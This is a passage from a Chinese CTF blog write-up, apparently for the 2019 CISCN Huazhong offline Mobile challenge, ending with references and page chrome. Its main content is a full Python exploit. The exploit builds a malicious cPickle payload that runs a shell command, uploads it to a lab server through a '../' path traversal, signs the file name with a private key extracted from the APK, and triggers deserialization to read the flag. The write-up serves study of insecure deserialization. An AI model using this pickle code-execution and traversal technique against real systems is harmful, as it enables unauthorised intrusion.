class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> M2Crypto</span><br><span class="line"></span><br><span class="line">phone_name = <span class="string">'865166025111652'</span> <span class="comment">#序列化的文件名</span></span><br><span class="line">flag_name  = <span class="string">'111111111111111'</span> <span class="comment">#flag的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> (__import__(<span class="string">'os'</span>).system, (<span class="string">'cat flag &gt; ./image/'</span> + flag_name,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#私钥加密，公钥解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">private_encrypt</span><span class="params">(msg, file_name)</span>:</span></span><br><span class="line">    rsa_pri = M2Crypto.RSA.load_key(file_name)</span><br><span class="line">    ctxt_pri = rsa_pri.private_encrypt(msg, M2Crypto.RSA.pkcs1_padding)</span><br><span class="line">    ctxt64_pri = ctxt_pri.encode(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">print</span> ctxt64_pri</span><br><span class="line">    <span class="keyword">return</span> ctxt64_pri</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.41.8:5000/upload'</span></span><br><span class="line">    files = &#123;<span class="string">'myfile'</span>: (<span class="string">'../phone/'</span> + phone_name, open(phone_name, <span class="string">'rb'</span>))&#125;     </span><br><span class="line">    requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserialization</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.41.8:5000/search'</span></span><br><span class="line">    data = &#123;<span class="string">'imei'</span> : imei&#125;</span><br><span class="line">    requests.post(url, data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.41.8:5000/check'</span></span><br><span class="line">    data = &#123;<span class="string">'myfile'</span> : flag_name&#125;</span><br><span class="line">    r = requests.post(url, data)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line">file = open(phone_name,<span class="string">'wb'</span>)</span><br><span class="line">a = A()</span><br><span class="line">cPickle.dump(a, file) <span class="comment">#序列化</span></span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">upload_file() <span class="comment">#上传序列化文件</span></span><br><span class="line"></span><br><span class="line">imei = private_encrypt(phone_name, <span class="string">'key.pem'</span>) <span class="comment">#key.pem是之前从apk中提取出来的私钥</span></span><br><span class="line"></span><br><span class="line">deserialization() <span class="comment">#反序列化</span></span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170522.bmp" alt="6.bmp"></p>
+<h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><p><a href="https://blog.csdn.net/SKI_12/article/details/85015803" target="_blank" rel="noopener">(Python)cPickle反序列化漏洞</a></p>
+<p><a href="https://blog.csdn.net/cybeyond_xuan/article/details/82985066" target="_blank" rel="noopener">Python 之 cPickle用法</a></p>
+<p><a href="http://www.php.cn/python-tutorials-371684.html" target="_blank" rel="noopener">M2Crypto RSA加密、解密的实例介绍</a></p>
+<p><a href="https://www.cnblogs.com/android-it/p/9558751.html" target="_blank" rel="noopener">12.Python使用requests发送post请求</a></p>
+<p><a href="https://www.cnblogs.com/ribavnu/p/4844376.html" target="_blank" rel="noopener">python3 post方式上传文件。</a></p>
+<h1 id="0x05-附件"><a href="#0x05-附件" class="headerlink" title="0x05 附件"></a>0x05 附件</h1><p>题目压缩包: <a href="https://pan.baidu.com/s/1iBdJigY46Rv0r22pWm15qA" target="_blank" rel="noopener">https://pan.baidu.com/s/1iBdJigY46Rv0r22pWm15qA</a> 提取码: hmah</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>SAMO
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://samo.fun/2019/06/04/CISCN2019_OFFLINE/" title="2019年全国大学生信息安全竞赛(华中赛区)线下赛Mobile">http://samo.fun/2019/06/04/CISCN2019_OFFLINE/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/06/CISCN2017/" rel="prev" title="2017年全国大学生信息安全竞赛Crypto(未更新完)">
+      <i class="fa fa-chevron-left"></i> 2017年全国大学生信息安全竞赛Crypto(未更新完)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/25/github_images_bed/" rel="next" title="Github搭建图床 + jsDelivr CDN加速">
+      Github搭建图床 + jsDelivr CDN加速 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="space"></div>
+    <div class="sidebar-inner">
+
+
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a href="/">
+    <img class="site-author-image" itemprop="image" alt="SAMO"
+      src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325201538.jpg">
+  <p class="site-author-name" itemprop="name">SAMO</p>
+  </a>
+  <div class="site-description" itemprop="description">Have fun!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-root">
+        <a href="/">
+        <span class="site-state-item-count">
+          <i class="fa fa-fw fa-home"></i>
+        </span>
+        <span class="site-state-item-name">首页</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SAMOxtan" title="GitHub → https://github.com/SAMOxtan" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:samoxtan@gmail.com" title="E-Mail → mailto:samoxtan@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-APK分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 APK分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-index-py分析"><span class="nav-number">3.</span> <span class="nav-text">0x02 index.py分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-构建exp"><span class="nav-number">4.</span> <span class="nav-text">0x03 构建exp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建序列化文件"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">创建序列化文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传到服务端"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">上传到服务端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加密文件名"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">加密文件名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化-amp-输出flag"><span class="nav-number">4.0.0.4.</span> <span class="nav-text">反序列化 &amp; 输出flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#完整exp"><span class="nav-number">4.0.0.5.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-Reference"><span class="nav-number">5.</span> <span class="nav-text">0x04 Reference</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-附件"><span class="nav-number">6.</span> <span class="nav-text">0x05 附件</span></a></li></ol></div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SAMO</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.2
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
